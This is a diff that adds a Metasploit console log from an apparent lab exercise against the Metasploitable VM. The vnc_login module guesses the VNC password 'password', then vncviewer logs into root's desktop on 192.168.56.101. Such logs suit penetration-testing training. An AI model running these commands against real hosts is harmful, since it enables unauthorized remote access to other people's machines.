@@ -1,0 +1,20 @@
+msf >  use auxiliary/scanner/vnc/vnc_login
+msf auxiliary(vnc_login) > set RHOSTS 192.168.56.101
+RHOSTS => 192.168.56.101
+msf auxiliary(vnc_login) > exploit
+
+[*] 192.168.56.101:5900   - 192.168.56.101:5900 - Starting VNC login sweep
+[+] 192.168.56.101:5900   - 192.168.56.101:5900 - Login Successful: :password
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+msf auxiliary(vnc_login) > back
+
+msf > vncviewer 192.168.56.101:5900
+[*] exec: vncviewer 192.168.56.101:5900
+
+Connected to RFB server, using protocol version 3.3
+Performing standard VNC authentication
+Password: 
+Authentication successful
+Desktop name "root's X desktop (metasploitable:0)"
